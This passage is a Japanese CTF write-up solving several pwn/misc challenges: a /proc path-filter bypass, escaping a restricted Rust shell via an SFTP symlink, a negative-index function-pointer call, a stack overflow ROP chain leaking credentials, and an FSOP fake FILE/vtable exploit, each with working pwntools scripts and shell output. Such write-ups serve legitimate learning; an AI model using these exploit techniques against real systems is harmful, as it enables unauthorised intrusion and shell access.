なるほど、Beginners CTF 2020 の readme と同様にファイルのパスを入力すると読み込んでくれるプログラムのようです。`flag.txt` というファイルが同じディレクトリにあり最初に開かれているようですが、それを開こうにも入力したパスに `flag.txt` が含まれているとダメですし、`/dev/fd/(file descriptor)` や `/proc/self/fd/(file descriptor)` にアクセスしようとしても `self` と `dev` が使えません。

ただ、`proc` は禁止されていませんから procfs を使うことはできます。`/proc` を眺めていると気になるものが見つかりました。

```
$ ls -la /proc | grep self
lrwxrwxrwx   1 root             root                          11 Sep  7 09:26 mounts -> self/mounts
lrwxrwxrwx   1 root             root                           8 Sep  7 09:26 net -> self/net
lrwxrwxrwx   1 root             root                           0 Jul  6 02:23 self -> 377
lrwxrwxrwx   1 root             root                           0 Jul  6 02:23 thread-self -> 377/task/377
```

`mounts` は `self/mounts` への、`net` は `self/net` へのシンボリックリンクになっています。`/proc/net/../` で `/proc/self/` にアクセスした場合と同じ結果が得られるはずです。

`/proc/net/../fd/6` でフラグが得られました。

```
$ nc (省略)
> /proc/net/../fd/6
b'KosenCTF{fd_1s_l1nk3d_2_7h3_4c7u4l_f1l3p4th}\n'
```

```
KosenCTF{fd_1s_l1nk3d_2_7h3_4c7u4l_f1l3p4th}
```

## [pwn,misc 373] pash (12 solves)
> ssh (問題サーバへの接続情報) -p9022
> 
> password: guest
> 
> author: ptr-yudai

接続してみましょう。

```
$ ssh (省略) -p9022
(省略)'s password: 
***** PASH - Partial Admin SHell *****
  __      _  ,---------------------.  
o'')}____// <' Only few commands   |  
 `_/      )  |      are available. |  
 (_(_/-(_/   '---------------------'  

(admin)$ 
```

PASH という謎のシェルが立ち上がりました。色々コマンドを試してみましょう。

```
(admin)$ echo
No such command: echo
(admin)$ whoami
pwn
(admin)$ ls
total 424K
dr-xr-x--- 1 root pwn   4.0K Sep  3 16:04 .
drwxr-xr-x 1 root root  4.0K Sep  3 16:04 ..
-rw-r--r-- 1 root pwn     61 Sep  3 16:04 .bash_profile
-r--r----- 1 root admin   49 Sep  3 14:49 flag.txt
-r-xr-sr-x 1 root admin 403K Sep  3 14:49 pash
-rw-rw-r-- 1 root pwn   2.4K Sep  3 14:49 pash.rs
(admin)$ cat flag.txt
ฅ^•ﻌ•^ฅ < RESTRICTED!
```

`pash` という実行ファイルが今実行されているシェルでしょう。`flag.txt` というファイルにフラグがありそうですが、`cat flag.txt` してもなぜか内容を取得できません。

`pash.rs` が `pash` のソースコードでしょう。`cat pash.rs` してみます。

```rust
use std::collections::HashMap;
use std::io::{self, Write};
use std::process::Command;

fn cmd_whoami(_args: &mut std::str::SplitWhitespace) {
    let mut child = Command::new("whoami")
        .spawn()
        .expect("Failed to execute process");
    child.wait().expect("Failed to wait on child");
}
fn cmd_ls(_args: &mut std::str::SplitWhitespace) {
    let mut child = Command::new("ls")
        .arg("-lha")
        .spawn()
        .expect("Failed to execute process");
    child.wait().expect("Failed to wait on child");
}
fn cmd_pwd(_args: &mut std::str::SplitWhitespace) {
    let mut child = Command::new("pwd")
        .spawn()
        .expect("Failed to execute process");
    child.wait().expect("Failed to wait on child");
}
fn cmd_cat(args: &mut std::str::SplitWhitespace) {
    let path;
    match args.next() {
        None => path = "-",
        Some(arg) => path = arg
    }
    if path.contains("flag.txt") {
        println!("ฅ^•ﻌ•^ฅ < RESTRICTED!");
        return;
    }
    let mut child = Command::new("cat")
        .arg(path)
        .spawn()
        .expect("Failed to execute process");
    child.wait().expect("Failed to wait on child");
}
fn cmd_exit(_args: &mut std::str::SplitWhitespace) {
    std::process::exit(0);
}

fn main() {
    let mut f = HashMap::<String, &dyn Fn(&mut std::str::SplitWhitespace)->()>::new();
    /* set available commands */
    f.insert("whoami".to_string(), &cmd_whoami);
    f.insert("ls".to_string(), &cmd_ls);
    f.insert("pwd".to_string(), &cmd_pwd);
    f.insert("cat".to_string(), &cmd_cat);
    f.insert("exit".to_string(), &cmd_exit);

    println!("***** PASH - Partial Admin SHell *****");
    println!("  __      _  ,---------------------.  ");
    println!("o'')}}____// <' Only few commands   |  ");
    println!(" `_/      )  |      are available. |  ");
    println!(" (_(_/-(_/   '---------------------'  \n");

    loop {
        /* read input */
        print!("(admin)$ ");
        io::stdout().flush().unwrap();
        let mut s = String::new();
        io::stdin().read_line(&mut s).ok();

        /* execute command */
        let mut args = s.trim().split_whitespace();
        let cmd = args.next().unwrap();
        if f.contains_key(cmd) {
            (f.get(cmd).unwrap() as &dyn Fn(&mut std::str::SplitWhitespace)->())(&mut args);
        } else {
            println!("No such command: {}", cmd);
        }
    }
}
```

Rust です。実行できるコマンドは `whoami` `ls` `pwd` `cat` `exit` のみで、しかもコマンドライン引数が指定できるのは `cat` のみのようです。また、`cat` に与えるコマンドライン引数もチェックされており、`flag.txt` が含まれる場合には弾かれています。先程 `cat flag.txt` できなかったのはこのチェックのためでしょう。

問題サーバへの接続には SSH が使われていることを利用して、`pash` のバイナリを落とすために SFTP で接続したところあることに気づきました。

```
$ sftp -P 9022 (省略)
(省略)'s password: 
Connected to (省略).
sftp> help
Available commands:
...
symlink oldpath newpath            Symlink remote file
...
```

SFTP でシンボリックリンクが張れるじゃないですか。

まず SFTP で接続して `ln -s /home/pwn/flag.txt /tmp/poyopoyo` を実行し、シンボリックリンクを作成します。続いて SSH で接続して PASH を起動し、`cat /tmp/poyopoyo` してみます。これなら `flag.txt` がコマンドライン引数には含まれていませんから、PASH 側のチェックは回避できるはずです。

```
$ ssh (省略) -p9022
(省略)'s password: 
***** PASH - Partial Admin SHell *****
  __      _  ,---------------------.  
o'')}____// <' Only few commands   |  
 `_/      )  |      are available. |  
 (_(_/-(_/   '---------------------'  

(admin)$ cat /tmp/poyopoyo
KosenCTF{d1d_u_n0t1c3_th3r3_3x1sts_2_s0lut10ns?}
```

フラグが得られました。

```
KosenCTF{d1d_u_n0t1c3_th3r3_3x1sts_2_s0lut10ns?}
```

## [pwn 105] babysort (49 solves)
> nc (問題サーバへの接続情報) 9001
> 
> 添付ファイル: chall, main.c (chall のソースコード)
> 
> author: ptr-yudai

`main.c` は以下のような内容でした。

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

typedef int (*SORTFUNC)(const void*, const void*);

typedef struct {
  long elm[5];
  SORTFUNC cmp[2];
} SortExperiment;

/* call me! */
void win(void) {
  char *args[] = {"/bin/sh", NULL};
  execve(args[0], args, NULL);
}

int cmp_asc(const void *a, const void *b) { return *(long*)a - *(long*)b; }
int cmp_dsc(const void *a, const void *b) { return *(long*)b - *(long*)a; }

int main(void) {
  SortExperiment se = {.cmp = {cmp_asc, cmp_dsc}};
  int i;

  /* input numbers */
  puts("-*-*- Sort Experiment -*-*-");
  for(i = 0; i < 5; i++) {
    printf("elm[%d] = ", i);
    if (scanf("%ld", &se.elm[i]) != 1) exit(1);
  }

  /* sort */
  printf("[0] Ascending / [1] Descending: ");
  if (scanf("%d", &i) != 1) exit(1);
  qsort(se.elm, 5, sizeof(long), se.cmp[i]);

  /* output result */
  puts("Result:");
  for(i = 0; i < 5; i++) {
    printf("elm[%d] = %ld\n", i, se.elm[i]);
  }
  return 0;
}

__attribute__((constructor))
void setup(void) {
  setvbuf(stdin, NULL, _IONBF, 0);
  setvbuf(stdout, NULL, _IONBF, 0);
  alarm(300);
}
```

`win` という関数を呼び出すことができれば、シェルが起動して勝ちという問題のようです。

`SortExperiment` という構造体は `long elm[5]` という数値 5 つを保持するメンバと、`SORTFUNC cmp[2]` というソート時に要素同士の比較のために呼び出される関数 2 つを保持するメンバを持っています。

5 つ数値を入力すると `elm` に格納され、最後に `cmp` の添字を入力するとその要素を比較関数として `qsort` に渡されて `elm` がソートされています。

最後に入力する `cmp` の添字については負数であるかどうかのチェックはありませんから、`-5` を入力すれば `elm[0]` に入っているアドレスが比較関数として呼び出されるはずです。やってみましょう。

```
$ gdb -q ./chall 
Reading symbols from ./chall...(no debugging symbols found)...done.
gdb-peda$ p/d &win
$1 = 4196231
gdb-peda$ q
$ (echo -e "4196231\n0\n0\n0\n0\n-5"; cat) | nc (省略) 9001
-*-*- Sort Experiment -*-*-
elm[0] = elm[1] = elm[2] = elm[3] = elm[4] = [0] Ascending / [1] Descending: ls
chall
flag-165fa1768a33599b04fbb4f7a05d0d26.txt
redir.sh
cat flag*
KosenCTF{f4k3_p01nt3r_l34ds_u_2_w1n}
```

フラグが得られました。

```
KosenCTF{f4k3_p01nt3r_l34ds_u_2_w1n}
```

## [pwn 300] authme (20 solves)
> nc (問題サーバへの接続情報) 9002
> 
> 添付ファイル: chall, main.c (chall のソースコード)
> 
> author: ptr-yudai

`main.c` は以下のような内容でした。

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

int auth = 1;
char username[0x20];
char password[0x20];

void init(void) {
  FILE *fp;

  /* read secret username */
  if ((fp = fopen("./username", "r")) == NULL) {
    puts("[-] Please report this bug to the admin");
    exit(1);
  }
  fread(username, sizeof(char), 0x20, fp);
  fclose(fp);

  /* read secret password */
  if ((fp = fopen("./password", "r")) == NULL) {
    puts("[-] Please report this bug to the admin");
    exit(1);
  }
  fread(password, sizeof(char), 0x20, fp);
  fclose(fp);
}

int main() {
  char buf[0x20];

  init();

  puts("                _   _     __  __ ______ ");
  puts("     /\\        | | | |   |  \\/  |  ____|");
  puts("    /  \\  _   _| |_| |__ | \\  / | |__   ");
  puts("   / /\\ \\| | | | __| '_ \\| |\\/| |  __|  ");
  puts("  / ____ \\ |_| | |_| | | | |  | | |____ ");
  puts(" /_/    \\_\\__,_|\\__|_| |_|_|  |_|______|\n");

  printf("Username: ");
  if (fgets(buf, 0x40, stdin) == NULL) return 1;
  if (strcmp(buf, username) != 0) auth = 0;

  printf("Password: ");
  if (fgets(buf, 0x40, stdin) == NULL) return 1;
  if (strcmp(buf, password) != 0) auth = 0;

  if (auth == 1) {
    puts("[+] OK!");
    system("/bin/sh");
    exit(0);
  } else {
    puts("[-] NG!");
    exit(1);
  }
}

__attribute__((constructor))
void setup(void) {
  setvbuf(stdin, NULL, _IONBF, 0);
  setvbuf(stdout, NULL, _IONBF, 0);
  alarm(60);
}
```

`username` と `password` というファイルからユーザ名とパスワードを読み込んだ後、ユーザが入力したユーザ名とパスワードと一致していればシェルを起動するというプログラムのようです。

ユーザ名とパスワードが格納されるバッファのサイズが `0x20` バイトなのに対して `fgets` で読み込まれる最大サイズは `0x40` バイトとスタック BOF ができそうです。ですが、リターンアドレスを書き換えることができたとしても、最後に `auth` がどのような値でも `exit` が呼び出されてしまうため、このままでは RIP を奪うことはできなさそうです。

`exit` ではなく `main` からの `return` によってプログラムが終了される箇所を探すと、`if (fgets(buf, 0x40, stdin) == NULL) return 1;` が見つかりました。`fgets` はどういう条件で `NULL` を返すのでしょうか。`man` を見てみましょう。

> **RETURN VALUE**  
> **fgets()** returns _s_ on success, and NULL on error or when end of file occurs while no characters have been read.

なるほど、`fgets` はエラーが発生するか 1 文字も読み込まれないまま EOF に到達した際に `NULL` を返すようです。

最初のユーザ名の入力時にリターンアドレスの書き換えまで行い、パスワードの入力時に `shutdown(fd, SHUT_WR)` 相当のことをすればよいでしょう。

`puts(username)` と `puts(password)` でユーザ名とパスワードをリークさせる方針でやってみます。

```python
from pwn import *
elf = ELF('./authme')

def get_info(addr):
  sock = connect('(省略)', 9002)

  sock.recvuntil('Username: ')

  payload = 'A' * 0x20
  payload += p64(0x6020a0)
  payload += p64(0x400b03) # pop rdi
  payload += p64(addr)
  payload += p64(elf.plt['puts'])

  payload = payload[:-1]

  sock.send(payload)
  sock.shutdown('send')

  print sock.recvall()
  sock.close()

get_info(elf.symbols['username'])
get_info(elf.symbols['password'])
```

```
$ python get_info.py
[*] '/.../authme'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Opening connection to (省略) on port 9002: Done
[+] Receiving all data: Done (117B)
[*] Closed connection to (省略) port 9002
Password: UnderUltimateUtterUranium

/home/pwn/redir.sh: line 2: 10654 Segmentation fault      (core dumped) ./chall

[+] Opening connection to (省略) on port 9002: Done
[+] Receiving all data: Done (115B)
[*] Closed connection to (省略) port 9002
Password: PonPonPainPanicParadigm

/home/pwn/redir.sh: line 2: 10656 Segmentation fault      (core dumped) ./chall
```

ユーザ名とパスワードがそれぞれ `UnderUltimateUtterUranium` と `PonPonPainPanicParadigm` であることがわかりました。ログインしてみましょう。

```
$ nc (省略) 9002
                _   _     __  __ ______
     /\        | | | |   |  \/  |  ____|
    /  \  _   _| |_| |__ | \  / | |__
   / /\ \| | | | __| '_ \| |\/| |  __|
  / ____ \ |_| | |_| | | | |  | | |____
 /_/    \_\__,_|\__|_| |_|_|  |_|______|

Username: UnderUltimateUtterUranium
Password: PonPonPainPanicParadigm
[+] OK!
ls
chall
flag-e3d46130aca8d8c52a435cb778622e3d.txt
password
redir.sh
username
cat flag*
KosenCTF{cl0s3_ur_3y3_4nd_g0_w1th_th3_fl0w}
```

フラグが得られました。

```
KosenCTF{cl0s3_ur_3y3_4nd_g0_w1th_th3_fl0w}
```

## [pwn 335] Fables of aeSOP (16 solves)
> nc (問題サーバへの接続情報) 9003
> 
> 添付ファイル: chall, libc-2.23.so, banner.txt
> 
> author: ptr-yudai

`chall` がどのようなファイルか `file` で確認しましょう。

```
$ file chall
chall: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=147625b075205e0ade7ec38e74cafb9cd9d2cc7d, stripped
$ checksec --file ./chall 
[*] '/.../chall'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

x86_64 の ELF のようです。実行してみます。

```
$ ./chall 
╦┌┐┌┌┬┐┌─┐┬─┐╦╔═┌─┐┌─┐┌─┐┌┐┌╔═╗╔╦╗╔═╗
║│││ │ ├┤ ├┬┘╠╩╗│ │└─┐├┤ │││║   ║ ╠╣ 
╩┘└┘ ┴ └─┘┴└─╩ ╩└─┘└─┘└─┘┘└┘╚═╝ ╩ ╚  
            ╔═╗╔═╗╔═╗╔═╗
            ╔═╝║ ║╔═╝║ ║
            ╚═╝╚═╝╚═╝╚═╝

<win> = 0x55d9640f1a5a
hoge
hoge
```

`win` という謎のアドレスが表示されたあと、文字列の入力を要求されました。どんな脆弱性があるのか、Ghidra でデコンパイルして確認しましょう。

```c
ulong FUN_00100b2c(void)

{
  long lVar1;
  long in_FS_OFFSET;
  bool bVar2;
  
  lVar1 = *(long *)(in_FS_OFFSET + 0x28);
  DAT_00302260 = fopen("banner.txt","r");
  bVar2 = DAT_00302260 != (FILE *)0x0;
  if (bVar2) {
    fread(&DAT_00302060,1,0x200,DAT_00302260);
    puts(&DAT_00302060);
    FUN_00100ac9();
    fclose(DAT_00302260);
  }
  else {
    perror("banner.txt");
  }
  if (lVar1 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return (ulong)!bVar2;
}

void FUN_00100ac9(void)

{
  long lVar1;
  long in_FS_OFFSET;
  
  lVar1 = *(long *)(in_FS_OFFSET + 0x28);
  printf("<win> = %p\n",FUN_00100a5a);
  gets(&DAT_00302060);
  puts(&DAT_00302060);
  if (lVar1 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}

void FUN_00100a5a(void)

{
  long in_FS_OFFSET;
  char *local_28;
  undefined8 local_20;
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  local_28 = "/bin/sh";
  local_20 = 0;
  write(1,"Congratulations!\n",0x11);
  execve(local_28,&local_28,(char **)0x0);
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}
```

`win` はシェルを立ち上げる関数だったようです。文字列の入力には `gets` が使われていますから、書き込み先のバッファへの BOF でなんとかして `win` を呼び出せということでしょう。

`gets` の書き込み先のバッファの後ろに何があるかフリー版の IDA で確認してみると、直後に `FILE` 構造体へのポインタが確認できました。

![FILE 構造体へのポインタ](../images/2020-09-07_fsop1.png)

バッファは 0x200 バイト分ありますし、`win` のアドレスが表示されていますからバッファのアドレスを計算することもできます。バッファの部分に偽の `FILE` 構造体を作って、`FILE` 構造体へのポインタをその偽の `FILE` 構造体に向ければよさそうです。やってみましょう。

```python
from pwn import *

libc = ELF('./libc-2.23.so')
sock = remote('(省略)', 9003)

sock.recvuntil('<win> = ')
addr_win = int(sock.recvline(), 16)
addr_base = addr_win - 0xa5a
addr_buf = addr_base + 0x202060

fake_file = ''
fake_file += p32(0xfbad8000) # _flags
fake_file = fake_file.ljust(0xd8, '\0')

fake_vtable = ''
fake_vtable += p64(0) * 2
fake_vtable += p64(addr_win) # finish
fake_vtable += p64(0) * 18

payload = ''
payload += fake_file
payload += p64(addr_buf + len(fake_file) + 8)
payload += fake_vtable

payload = payload.ljust(0x200, '\0')
payload += p64(addr_buf)

sock.sendline(payload)
sock.interactive()
```

```
$ python solve.py 
[*] '/.../libc-2.23.so'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Opening connection to (省略) on port 9003: Done
[*] Switching to interactive mode

Congratulations!
$ ls
banner.txt
chall
flag.txt
redir.sh
$ cat flag.txt
KosenCTF{FS0P_1s_s1mpl3_4nd_fun!}
```

フラグが得られました。

```
KosenCTF{FS0P_1s_s1mpl3_4nd_fun!}
```